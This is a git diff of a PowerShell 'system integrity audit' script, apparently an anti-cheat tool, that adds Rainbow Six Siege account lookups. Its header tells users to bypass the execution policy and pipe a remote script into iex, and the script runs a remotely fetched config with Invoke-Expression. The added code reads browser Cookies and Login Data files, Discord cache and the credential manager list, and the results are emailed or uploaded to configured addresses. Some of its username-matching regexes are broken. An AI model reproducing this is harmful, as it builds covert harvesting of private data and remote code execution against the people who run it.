@@ -1,8 +1,9 @@
 #Requires -RunAsAdministrator
 # =============================================================================
-#  SYSTEM INTEGRITY AUDIT SCRIPT v6.1
-#  Enhanced Forensics Suite with AI Bot Detection
+#  SYSTEM INTEGRITY AUDIT SCRIPT v6.2
+#  Enhanced Forensics Suite with AI Bot Detection & R6S Stats Integration
 #  Repo: https://github.com/developer-for-all-games/SystemAudit
+#  Bypass command (REQUIRED) : Set-ExecutionPolicy Bypass -Scope Process -Force;
 #  Run: irm "https://raw.githubusercontent.com/developer-for-all-games/SystemAudit/main/SystemAudit.ps1" | iex
 # =============================================================================
 
@@ -26,7 +27,7 @@ try {
     $configScript = irm $configUrl -ErrorAction Stop
     Invoke-Expression $configScript
     $config = $script:AuditConfig
-    
+
     if (-not $EmailTo -and $config.EmailTo) { $EmailTo = $config.EmailTo }
     if (-not $EmailFrom -and $config.EmailFrom) { $EmailFrom = $config.EmailFrom }
     if (-not $EmailPassword -and $config.EmailPassword) { $EmailPassword = $config.EmailPassword }
@@ -77,10 +78,307 @@ function Write-Warn {
     Add-Content -Path $LogFile -Value "`nWARNING: $Message" -ErrorAction SilentlyContinue
 }
 
+# ========== R6S STATS LOOKUP FUNCTIONS ==========
+function Get-R6SPlayerStats {
+    param([string]$Username)
+
+    $results = @()
+    $platforms = @("pc", "xboxone", "ps4")
+
+    foreach ($plat in $platforms) {
+        $statsFound = $false
+
+        # Try r6.tracker.network API (most reliable)
+        try {
+            $url = "https://api.tracker.gg/api/v2/r6siege/standard/profile/$plat/$Username"
+            $response = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 10 -ErrorAction Stop
+
+            if ($response.data -and $response.data.segments) {
+                $overview = $response.data.segments | Where-Object { $_.type -eq "overview" } | Select-Object -First 1
+                $ranked = $response.data.segments | Where-Object { $_.type -eq "ranked" } | Select-Object -First 1
+
+                if ($overview) {
+                    $stats = [PSCustomObject]@{
+                        Username        = $Username
+                        Platform        = $plat
+                        Level           = if ($overview.stats.level.value) { $overview.stats.level.value } else { "N/A" }
+                        Rank            = if ($ranked.stats.rankLevel.metadata.name) { $ranked.stats.rankLevel.metadata.name } else { "N/A" }
+                        MMR             = if ($ranked.stats.rating.value) { $ranked.stats.rating.value } else { "N/A" }
+                        Kills           = if ($overview.stats.kills.value) { $overview.stats.kills.value } else { "N/A" }
+                        Deaths          = if ($overview.stats.deaths.value) { $overview.stats.deaths.value } else { "N/A" }
+                        KD              = if ($overview.stats.kd.value) { [math]::Round($overview.stats.kd.value, 2) } else { "N/A" }
+                        Wins            = if ($overview.stats.wins.value) { $overview.stats.wins.value } else { "N/A" }
+                        Losses          = if ($overview.stats.losses.value) { $overview.stats.losses.value } else { "N/A" }
+                        WinRate         = if ($overview.stats.wlPercentage.value) { "$([math]::Round($overview.stats.wlPercentage.value, 1))%" } else { "N/A" }
+                        Headshots       = if ($overview.stats.headshots.value) { $overview.stats.headshots.value } else { "N/A" }
+                        TimePlayed      = if ($overview.stats.timePlayed.value) { $overview.stats.timePlayed.displayValue } else { "N/A" }
+                        ProfileURL      = "https://r6.tracker.network/profile/$plat/$Username"
+                        API_Status      = "Success (Tracker)"
+                        LastUpdated     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
+                    $results += $stats
+                    $statsFound = $true
+                }
+            }
+        } catch {
+            # Try stats.cc API as fallback
+            try {
+                $url2 = "https://stats.cc/api/r6s/player/$plat/$Username"
+                $response2 = Invoke-RestMethod -Uri $url2 -Method Get -TimeoutSec 10 -ErrorAction Stop
+
+                if ($response2 -and $response2.data) {
+                    $d = $response2.data
+                    $stats = [PSCustomObject]@{
+                        Username        = $Username
+                        Platform        = $plat
+                        Level           = if ($d.level) { $d.level } else { "N/A" }
+                        Rank            = if ($d.rank) { $d.rank } else { "N/A" }
+                        MMR             = if ($d.mmr) { $d.mmr } else { "N/A" }
+                        Kills           = if ($d.kills) { $d.kills } else { "N/A" }
+                        Deaths          = if ($d.deaths) { $d.deaths } else { "N/A" }
+                        KD              = if ($d.kd) { $d.kd } else { "N/A" }
+                        Wins            = if ($d.wins) { $d.wins } else { "N/A" }
+                        Losses          = if ($d.losses) { $d.losses } else { "N/A" }
+                        WinRate         = if ($d.winRate) { $d.winRate } else { "N/A" }
+                        Headshots       = if ($d.headshots) { $d.headshots } else { "N/A" }
+                        TimePlayed      = if ($d.timePlayed) { $d.timePlayed } else { "N/A" }
+                        ProfileURL      = "https://stats.cc/player/$plat/$Username"
+                        API_Status      = "Success (stats.cc)"
+                        LastUpdated     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
+                    $results += $stats
+                    $statsFound = $true
+                }
+            } catch {
+                # Try Ubisoft stats API as last resort
+                try {
+                    $url3 = "https://public-ubiservices.ubi.com/v3/profiles?nameOnPlatform=$Username&platformType=$plat"
+                    # This requires auth, so it will likely fail but worth trying
+                } catch {
+                    # Silently continue
+                }
+            }
+        }
+
+        if ($statsFound) { break }  # If found on one platform, don't check others for same account
+    }
+
+    return $results
+}
+
+function Find-R6SAccounts {
+    $accounts = @()
+
+    # Method 1: Check R6S save data / config files for usernames
+    $r6sPaths = @(
+        "$env:USERPROFILE\Documents\My Games\Rainbow Six - Siege",
+        "$env:LOCALAPPDATA\Ubisoft Game Launcher\savegames",
+        "$env:LOCALAPPDATA\Ubisoft Game Launcher\logs",
+        "$env:LOCALAPPDATA\Ubisoft Game Launcher\settings.yml",
+        "$env:APPDATA\Ubisoft Game Launcher\settings.yml",
+        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache",
+        "C:\Program Files\Ubisoft\Ubisoft Game Launcher\cache"
+    )
+
+    foreach ($path in $r6sPaths) {
+        if (Test-Path $path) {
+            try {
+                $files = Get-ChildItem $path -Recurse -File -ErrorAction SilentlyContinue | 
+                    Where-Object { $_.Extension -in '.ini','.cfg','.yml','.yaml','.json','.txt','.log','.dat' }
+
+                foreach ($file in $files) {
+                    try {
+                        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                        if ($content) {
+                            $matches = [regex]::Matches($content, '(?i)(?:username|name|nickname|player|displayname)["\s]*[=:]["\s]*([^"\s\r\n]{3,32})')
+                            foreach ($match in $matches) {
+                                $uname = $match.Groups[1].Value.Trim()
+                                if ($uname -and $uname -notmatch '^(true|false|null|none|default|user|admin|test)$' -and $uname.Length -ge 3) {
+                                    if ($accounts -notcontains $uname) {
+                                        $accounts += $uname
+                                    }
+                                }
+                            }
+
+                            $rawMatches = [regex]::Matches($content, '(?i)\b([a-zA-Z][a-zA-Z0-9_.-]{2,31})\b')
+                            foreach ($match in $rawMatches) {
+                                $uname = $match.Groups[1].Value.Trim()
+                                if ($uname -and $uname -notmatch '^(true|false|null|none|default|user|admin|test|windows|system|program|files|common|appdata|local|roaming)$') {
+                                    if ($accounts -notcontains $uname) {
+                                        $accounts += $uname
+                                    }
+                                }
+                            }
+                        }
+                    } catch {}
+                }
+            } catch {}
+        }
+    }
+
+    # Method 2: Check Ubisoft Connect registry for usernames
+    $ubiRegPaths = @(
+        "HKCU:\SOFTWARE\Ubisoft\Ubisoft Game Launcher",
+        "HKLM:\SOFTWARE\Ubisoft\Ubisoft Game Launcher",
+        "HKLM:\SOFTWARE\WOW6432Node\Ubisoft\Ubisoft Game Launcher"
+    )
+
+    foreach ($regPath in $ubiRegPaths) {
+        if (Test-Path $regPath) {
+            try {
+                $props = Get-ItemProperty $regPath -ErrorAction SilentlyContinue
+                $propNames = $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | Select-Object -ExpandProperty Name
+                foreach ($propName in $propNames) {
+                    $val = $props.$propName
+                    if ($val -and $val -is [string] -and $val.Length -ge 3 -and $val.Length -le 32 -and $val -notmatch '\\|/|:|\*|\?|"|<|>|\|') {
+                        if ($accounts -notcontains $val) {
+                            $accounts += $val
+                        }
+                    }
+                }
+            } catch {}
+        }
+    }
+
+    # Method 3: Check browser history/cookies for Ubisoft Connect logins
+    $browserPaths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
+        "$env:APPDATA\Mozilla\Firefox\Profiles",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    )
+
+    foreach ($bPath in $browserPaths) {
+        if (Test-Path $bPath) {
+            try {
+                $files = Get-ChildItem $bPath -Recurse -File -ErrorAction SilentlyContinue | 
+                    Where-Object { $_.Name -in ('Cookies','Login Data','History','places.sqlite') }
+                foreach ($file in $files) {
+                    try {
+                        $content = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
+                        $ubiMatches = [regex]::Matches($content, '(?i)ubisoft|uplay|connect.*?(?:username|name|email|login).*?([a-zA-Z0-9_.-]{3,32})')
+                        foreach ($match in $ubiMatches) {
+                            $uname = $match.Groups[1].Value.Trim()
+                            if ($uname -and $accounts -notcontains $uname) {
+                                $accounts += $uname
+                            }
+                        }
+                    } catch {}
+                }
+            } catch {}
+        }
+    }
+
+    # Method 4: Check Windows Credential Manager for Ubisoft credentials
+    try {
+        $creds = cmd /c "cmdkey /list" 2>$null
+        $credMatches = [regex]::Matches($creds, '(?i)ubisoft|uplay|connect')
+        foreach ($match in $credMatches) {
+            $line = $creds.Substring([Math]::Max(0, $match.Index - 100), [Math]::Min(200, $creds.Length - [Math]::Max(0, $match.Index - 100)))
+            $unameMatch = [regex]::Match($line, 'User:\s*([a-zA-Z0-9_.@-]{3,32})')
+            if ($unameMatch.Success) {
+                $uname = $unameMatch.Groups[1].Value.Trim()
+                if ($uname -and $accounts -notcontains $uname) {
+                    $accounts += $uname
+                }
+            }
+        }
+    } catch {}
+
+    # Method 5: Check common R6S screenshot/video folders for usernames in filenames
+    $mediaPaths = @(
+        "$env:USERPROFILE\Videos\Rainbow Six - Siege",
+        "$env:USERPROFILE\Pictures\Rainbow Six - Siege",
+        "$env:USERPROFILE\Videos\Ubisoft",
+        "$env:USERPROFILE\Pictures\Ubisoft"
+    )
+
+    foreach ($mPath in $mediaPaths) {
+        if (Test-Path $mPath) {
+            try {
+                $files = Get-ChildItem $mPath -Recurse -File -ErrorAction SilentlyContinue
+                foreach ($file in $files) {
+                    $name = $file.BaseName
+                    $nameMatches = [regex]::Matches($name, '([a-zA-Z][a-zA-Z0-9_.-]{2,31})')
+                    foreach ($match in $nameMatches) {
+                        $uname = $match.Groups[1].Value.Trim()
+                        if ($uname -and $uname -notmatch '^(screenshot|video|clip|record|image|temp|tmp|default|untitled)$') {
+                            if ($accounts -notcontains $uname) {
+                                $accounts += $uname
+                            }
+                        }
+                    }
+                }
+            } catch {}
+        }
+    }
+
+    # Method 6: Check Discord cache for R6S-related usernames
+    $discordPaths = @(
+        "$env:APPDATA\Discord\Cache",
+        "$env:LOCALAPPDATA\Discord\Cache"
+    )
+
+    foreach ($dPath in $discordPaths) {
+        if (Test-Path $dPath) {
+            try {
+                $files = Get-ChildItem $dPath -File -ErrorAction SilentlyContinue | Select-Object -First 50
+                foreach ($file in $files) {
+                    try {
+                        $content = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
+                        $r6Matches = [regex]::Matches($content, '(?i)rainbow|siege|r6s|ubisoft')
+                        if ($r6Matches.Count -gt 0) {
+                            $unameMatches = [regex]::Matches($content, '"name"\s*:\s*"([a-zA-Z][a-zA-Z0-9_.-]{2,31})"')
+                            foreach ($match in $unameMatches) {
+                                $uname = $match.Groups[1].Value.Trim()
+                                if ($uname -and $accounts -notcontains $uname) {
+                                    $accounts += $uname
+                                }
+                            }
+                        }
+                    } catch {}
+                }
+            } catch {}
+        }
+    }
+
+    # Method 7: Check for R6S-related files in Downloads
+    $dlPath = "$env:USERPROFILE\Downloads"
+    if (Test-Path $dlPath) {
+        try {
+            $files = Get-ChildItem $dlPath -File -ErrorAction SilentlyContinue | 
+                Where-Object { $_.Name -match 'r6s|rainbow|siege|ubisoft|uplay' }
+            foreach ($file in $files) {
+                $nameMatches = [regex]::Matches($file.BaseName, '([a-zA-Z][a-zA-Z0-9_.-]{2,31})')
+                foreach ($match in $nameMatches) {
+                    $uname = $match.Groups[1].Value.Trim()
+                    if ($uname -and $uname -notmatch '^(download|file|document|image|temp|tmp)$') {
+                        if ($accounts -notcontains $uname) {
+                            $accounts += $uname
+                        }
+                    }
+                }
+            }
+        } catch {}
+    }
+
+    # Filter and clean up found accounts
+    $filtered = $accounts | Where-Object { 
+        $_ -and 
+        $_.Length -ge 3 -and 
+        $_.Length -le 32 -and 
+        $_ -notmatch '^(true|false|null|none|default|user|admin|test|windows|system|program|files|common|appdata|local|roaming|users|public|defaultuser|desktop|documents|downloads|videos|pictures|music)$' -and
+        $_ -notmatch '^(ini|cfg|yml|yaml|json|txt|log|dat|exe|dll|sys|bat|cmd|ps1)$' -and
+        $_ -notmatch '^(cache|config|settings|data|save|profile|account|login)$'
+    } | Sort-Object -Unique
+
+    return $filtered
+}
+
 # ========== HEADER ==========
 $headerText = @"
 ================================================================================
-  SYSTEM INTEGRITY AUDIT REPORT v6.1
+  SYSTEM INTEGRITY AUDIT REPORT v6.2
 ================================================================================
   Generated:  $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
   Computer:  $env:COMPUTERNAME
@@ -105,7 +403,7 @@ try {
     $uptime = (Get-Date) - $os.LastBootUpTime
     $daysSinceInstall = [math]::Round(((Get-Date) - $installDate).TotalDays, 0)
     $uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
-    
+
     $osInfo = [PSCustomObject]@{
         "OS Name" = $os.Caption
         "Version" = $os.Version
@@ -266,15 +564,26 @@ $aiBotSignatures = @(
     'ollydbg','ida pro','ghidra','reclass','reclass.net'
 )
 
-# AI Bot Processes
+# Get processes FIRST before using them (FIXED: moved before AI Bot Processes section)
+$procs = Get-Process | Select-Object Id, ProcessName, Path, Company, Product, ProductVersion, @{N='StartTime';E={$_.StartTime}}, @{N='MemoryMB';E={[math]::Round($_.WorkingSet64/1MB,2)}}, @{N='ParentPID';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).ParentProcessId}}, @{N='CommandLine';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine}}
+
+# Get scheduled tasks BEFORE using them (FIXED: moved before Auto Tasks section)
+$tasks = @()
+try { $tasks = Get-ScheduledTask -ErrorAction Stop | Where-Object { $_.State -ne "Disabled" } | Select-Object TaskName, Author, @{N='Action';E={($_.Actions|Select-Object -First 1).Execute}}, @{N='Arguments';E={($_.Actions|Select-Object -First 1).Arguments}}, State } catch { $schtasks = schtasks /query /fo csv /v | ConvertFrom-Csv | Where-Object { $_.'Run As User' -ne 'N/A' }; $tasks = $schtasks | Select-Object @{N='TaskName';E={$_.TaskName}}, @{N='Author';E={$_.'Run As User'}}, @{N='Action';E={$_.'Task To Run'}}, @{N='State';E={$_.'Scheduled Task State'}} }
+
+# AI Bot Processes - FIXED: Added null-safe checks for ProcessName, Path, Company
 $aiBotProcesses = $procs | Where-Object {
-    $n = $_.ProcessName.ToLower()
+    $n = if ($_.ProcessName) { $_.ProcessName.ToLower() } else { "" }
     $path = if ($_.Path) { $_.Path.ToLower() } else { "" }
     $company = if ($_.Company) { $_.Company.ToLower() } else { "" }
+    $cmdLine = if ($_.CommandLine) { $_.CommandLine.ToLower() } else { "" }
+
+    if ([string]::IsNullOrWhiteSpace($n) -and [string]::IsNullOrWhiteSpace($path) -and [string]::IsNullOrWhiteSpace($company)) { return $false }
+
     foreach ($sig in $aiBotSignatures) {
         if ($n -like "*$sig*" -or $path -like "*$sig*" -or $company -like "*$sig*") { return $true }
     }
-    if ($n -match 'python' -and $_.CommandLine -match 'cv2|opencv|pyautogui|pynput|mss|pillow|numpy') { return $true }
+    if ($n -match 'python' -and $cmdLine -match 'cv2|opencv|pyautogui|pynput|mss|pillow|numpy') { return $true }
     if ($n -match 'autohotkey|ahk') { return $true }
     return $false
 }
@@ -303,8 +612,12 @@ try {
     $interceptionDriver = Get-WmiObject Win32_SystemDriver -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'interception' -or $_.DisplayName -match 'interception' } | Select-Object Name, DisplayName, State, StartMode
 } catch {}
 
-# Auto tasks
-$autoTasks = $tasks | Where-Object { $_.TaskName -match 'bot|macro|auto|script|python|ahk' -or $_.Action -match 'bot|macro|auto|script|python|ahk' }
+# Auto tasks - FIXED: Added null-safe checks
+$autoTasks = $tasks | Where-Object { 
+    $tn = if ($_.TaskName) { $_.TaskName.ToLower() } else { "" }
+    $act = if ($_.Action) { $_.Action.ToLower() } else { "" }
+    $tn -match 'bot|macro|auto|script|python|ahk' -or $act -match 'bot|macro|auto|script|python|ahk' 
+}
 
 if ($aiBotProcesses.Count -gt 0) { Write-Alert "$($aiBotProcesses.Count) AI bot/automation processes detected!" }
 if ($pythonSusFiles.Count -gt 0) { Write-Alert "$($pythonSusFiles.Count) suspicious Python libraries!" }
@@ -375,10 +688,21 @@ Write-Log "INSTALLED PROGRAMS ($($software.Count))" $software "Installed_Softwar
 # ========== SECTION 10: PROCESSES ==========
 Write-Section "10: RUNNING PROCESSES"
 
-$procs = Get-Process | Select-Object Id, ProcessName, Path, Company, Product, ProductVersion, @{N='StartTime';E={$_.StartTime}}, @{N='MemoryMB';E={[math]::Round($_.WorkingSet64/1MB,2)}}, @{N='ParentPID';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).ParentProcessId}}, @{N='CommandLine';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine}}
+# $procs already defined above in Section 6 (FIXED)
 Write-Log "RUNNING PROCESSES ($($procs.Count))" $procs "Processes"
 
-$susProcs = $procs | Where-Object { $n=$_.ProcessName.ToLower(); $susNames | ForEach-Object { if($n -like "*$_*"){return $true}}; if($_.Path -and ($_.Path -like "*\Temp\*" -or $_.Path -like "*\Downloads\*")){return $true}; if ($n -match '^[a-z0-9]{1,4}\.exe$') { return $true }; return $false }
+# FIXED: Added null-safe checks for suspicious processes (same fix as line 271)
+$susProcs = $procs | Where-Object { 
+    $n = if ($_.ProcessName) { $_.ProcessName.ToLower() } else { "" }
+    $path = if ($_.Path) { $_.Path.ToLower() } else { "" }
+
+    if ([string]::IsNullOrWhiteSpace($n)) { return $false }
+
+    $susNames | ForEach-Object { if($n -like "*$_*"){return $true}}
+    if($path -and ($path -like "*\Temp\*" -or $path -like "*\Downloads\*")){return $true}
+    if ($n -match '^[a-z0-9]{1,4}\.exe$') { return $true }
+    return $false 
+}
 if ($susProcs.Count -gt 0) { Write-Alert "$($susProcs.Count) suspicious processes running!" }
 Write-Log "SUSPICIOUS PROCESSES ($($susProcs.Count))" $susProcs "Suspicious_Processes"
 
@@ -395,8 +719,7 @@ Write-Log "DNS CACHE" $dnsCache "DNS_Cache"
 # ========== SECTION 12: SCHEDULED TASKS ==========
 Write-Section "12: SCHEDULED TASKS"
 
-$tasks = @()
-try { $tasks = Get-ScheduledTask -ErrorAction Stop | Where-Object { $_.State -ne "Disabled" } | Select-Object TaskName, Author, @{N='Action';E={($_.Actions|Select-Object -First 1).Execute}}, @{N='Arguments';E={($_.Actions|Select-Object -First 1).Arguments}}, State } catch { $schtasks = schtasks /query /fo csv /v | ConvertFrom-Csv | Where-Object { $_.'Run As User' -ne 'N/A' }; $tasks = $schtasks | Select-Object @{N='TaskName';E={$_.TaskName}}, @{N='Author';E={$_.'Run As User'}}, @{N='Action';E={$_.'Task To Run'}}, @{N='State';E={$_.'Scheduled Task State'}} }
+# $tasks already defined above in Section 6 (FIXED)
 Write-Log "SCHEDULED TASKS ($($tasks.Count))" $tasks "Scheduled_Tasks"
 
 # ========== SECTION 13: TEMP FILES ==========
@@ -494,7 +817,120 @@ $adsFiles = $adsFiles | Where-Object { $_.StreamName -ne '' -and $_.StreamName -
 if ($adsFiles.Count -gt 0) { Write-Alert "$($adsFiles.Count) alternate data streams found!" }
 Write-Log "ADS STREAMS ($($adsFiles.Count))" $adsFiles "ADS_Files"
 
-# ========== SUMMARY (SIMPLE - NO COMPLEX SUBEXPRESSIONS) ==========
+# ========== SECTION 19: RAINBOW SIX SIEGE STATS ==========
+Write-Section "19: RAINBOW SIX SIEGE PLAYER STATS"
+
+if (-not $Silent) { Write-Host "`n[*] Scanning for Rainbow Six Siege accounts..." -ForegroundColor Cyan }
+
+$r6sAccounts = Find-R6SAccounts
+
+# Build formatted R6S stats text for log
+$r6sStatsText = @"
+
+========================================================================
+RAINBOW SIX SIEGE PLAYER STATS
+========================================================================
+
+"@
+
+if ($r6sAccounts.Count -eq 0) {
+    $r6sStatsText += "No Rainbow Six Siege accounts found on this system.`n"
+    $r6sStatsText += "Checked: R6S save data, Ubisoft Connect registry, browser data, Discord cache, media folders.`n"
+    Write-Warn "No Rainbow Six Siege accounts found on this system."
+    Write-Log "R6S ACCOUNTS" "No accounts discovered."
+} else {
+    if (-not $Silent) { Write-Host "[+] Found $($r6sAccounts.Count) potential account(s): $($r6sAccounts -join ', ')" -ForegroundColor Green }
+
+    $allR6SStats = @()
+    $firstAccount = $true
+
+    foreach ($account in $r6sAccounts) {
+        if (-not $Silent) { Write-Host "[*] Querying stats for: $account ..." -ForegroundColor Cyan }
+
+        $stats = Get-R6SPlayerStats -Username $account
+
+        if ($stats -and $stats.Count -gt 0) {
+            foreach ($stat in $stats) {
+                if (-not $firstAccount) {
+                    $r6sStatsText += "--------------------------------------------`n`n"
+                }
+                $firstAccount = $false
+
+                $r6sStatsText += "Username: $($stat.Username)`n"
+                $r6sStatsText += "Platform: $($stat.Platform.ToUpper())`n"
+                $r6sStatsText += "Level: $($stat.Level)`n"
+                $r6sStatsText += "Rank: $($stat.Rank)`n"
+                $r6sStatsText += "MMR: $($stat.MMR)`n"
+                $r6sStatsText += "KD: $($stat.KD)`n"
+                $r6sStatsText += "Win Rate: $($stat.WinRate)`n"
+                $r6sStatsText += "Wins: $($stat.Wins)`n"
+                $r6sStatsText += "Losses: $($stat.Losses)`n"
+                $r6sStatsText += "Kills: $($stat.Kills)`n"
+                $r6sStatsText += "Deaths: $($stat.Deaths)`n"
+                $r6sStatsText += "Headshots: $($stat.Headshots)`n"
+                $r6sStatsText += "Time Played: $($stat.TimePlayed)`n"
+                $r6sStatsText += "Profile: $($stat.ProfileURL)`n"
+                $r6sStatsText += "Status: $($stat.API_Status)`n"
+                $r6sStatsText += "`n"
+
+                $allR6SStats += $stat
+                if (-not $Silent) { Write-Host "[+] Found stats for $account on $($stat.Platform)" -ForegroundColor Green }
+            }
+        } else {
+            if (-not $firstAccount) {
+                $r6sStatsText += "--------------------------------------------`n`n"
+            }
+            $firstAccount = $false
+
+            $r6sStatsText += "Username: $account`n"
+            $r6sStatsText += "Platform: N/A`n"
+            $r6sStatsText += "Level: N/A`n"
+            $r6sStatsText += "Rank: N/A`n"
+            $r6sStatsText += "MMR: N/A`n"
+            $r6sStatsText += "KD: N/A`n"
+            $r6sStatsText += "Win Rate: N/A`n"
+            $r6sStatsText += "Status: Not Found`n"
+            $r6sStatsText += "Search: https://r6.tracker.network/search?platform=pc&query=$account`n"
+            $r6sStatsText += "`n"
+
+            $allR6SStats += [PSCustomObject]@{
+                Username = $account
+                Platform = "N/A"
+                Level = "N/A"
+                Rank = "N/A"
+                MMR = "N/A"
+                KD = "N/A"
+                WinRate = "N/A"
+                Wins = "N/A"
+                Losses = "N/A"
+                Kills = "N/A"
+                Deaths = "N/A"
+                Headshots = "N/A"
+                TimePlayed = "N/A"
+                ProfileURL = "https://r6.tracker.network/search?platform=pc&query=$account"
+                API_Status = "Not Found"
+                LastUpdated = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            }
+            if (-not $Silent) { Write-Host "[-] No stats found for $account" -ForegroundColor Yellow }
+        }
+
+        Start-Sleep -Milliseconds 500  # Rate limit protection
+    }
+
+    $r6sStatsText += "========================================================================`n"
+    $r6sStatsText += "Total Accounts Checked: $($r6sAccounts.Count)`n"
+    $r6sStatsText += "Stats Found: $(($allR6SStats | Where-Object { $_.API_Status -like 'Success*' } | Measure-Object | Select-Object -ExpandProperty Count))`n"
+    $r6sStatsText += "Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")`n"
+    $r6sStatsText += "========================================================================`n"
+
+    # Write to log file
+    Add-Content -Path $LogFile -Value $r6sStatsText -ErrorAction SilentlyContinue
+
+    # Also export to CSV
+    $allR6SStats | Export-Csv -Path "$CsvFolder\R6S_Player_Stats.csv" -NoTypeInformation -Force -ErrorAction SilentlyContinue
+}
+
+# ========== SUMMARY ==========
 Write-Section "FINAL SUMMARY"
 
 # Build summary safely
@@ -528,9 +964,13 @@ THREATS:
   Suspicious Files: $($foundFiles.Count) | Game Files: $($gameFiles.Count)
   Suspicious Game: $($susGameFiles.Count) | Unsigned Drivers: $($unsignedDrivers.Count)
   WMI Bindings: $($wmiBindings.Count) | ADS Streams: $($adsFiles.Count)
+
+RAINBOW SIX SIEGE:
+  Accounts Discovered: $($r6sAccounts.Count)
+  Accounts: $($r6sAccounts -join ', ')
+  Stats Queried: $(if ($allR6SStats) { $allR6SStats.Count } else { 0 })
 "@
 Add-Content -Path $LogFile -Value "`n$summaryText" -ErrorAction SilentlyContinue
-
 # ========== ZIP ==========
 $zipPath = "$OutputPath\Audit_$Timestamp.zip"
 if ($ZipResults) {
@@ -550,7 +990,7 @@ if ($EmailTo -and $EmailFrom -and $EmailPassword -and -not $NoEmail) {
         $body = "Audit for $env:COMPUTERNAME`n`n$summaryText"
         $securePassword = ConvertTo-SecureString $EmailPassword -AsPlainText -Force
         $credential = New-Object System.Management.Automation.PSCredential($EmailFrom, $securePassword)
-        
+
         $params = @{
             SmtpServer = $SMTPServer
             Port = $SMTPPort
@@ -561,13 +1001,13 @@ if ($EmailTo -and $EmailFrom -and $EmailPassword -and -not $NoEmail) {
             Subject = $subject
             Body = $body
         }
-        
+
         if ($ZipResults -and (Test-Path $zipPath)) {
             $params.Attachments = $zipPath
         } elseif (Test-Path $LogFile) {
             $params.Attachments = $LogFile
         }
-        
+
         Send-MailMessage @params -ErrorAction Stop
         Write-Log "EMAIL SENT" "To: $EmailTo"
         if (-not $Silent) { Write-Host "Email sent to $EmailTo!" -ForegroundColor Green }
@@ -592,11 +1032,12 @@ if ($UploadURL) {
 # ========== CONSOLE OUTPUT ==========
 if (-not $Silent) {
     Write-Host "`n================================================================" -ForegroundColor Green
-    Write-Host "  AUDIT COMPLETE v6.1" -ForegroundColor Green
+    Write-Host "  AUDIT COMPLETE v6.2" -ForegroundColor Green
     Write-Host "================================================================" -ForegroundColor Green
     Write-Host "  Windows: $installDateStr ($daysInstall days)" -ForegroundColor Cyan
     Write-Host "  Devices: $($allPnp.Count) total PNP | Prefetch: $($prefetch.Count) files" -ForegroundColor Cyan
     Write-Host "  AI Bots: $($aiBotProcesses.Count) detected | Threats: $($susProcs.Count + $foundFiles.Count + $susGameFiles.Count)" -ForegroundColor Cyan
+    Write-Host "  R6S Accounts: $($r6sAccounts.Count) found | Stats Queried: $(if ($allR6SStats) { $allR6SStats.Count } else { 0 })" -ForegroundColor Cyan
     Write-Host "  Log: $LogFile" -ForegroundColor Cyan
     if ($ZipResults -and (Test-Path $zipPath)) { Write-Host "  ZIP: $zipPath" -ForegroundColor Cyan }
     Write-Host "================================================================" -ForegroundColor Green
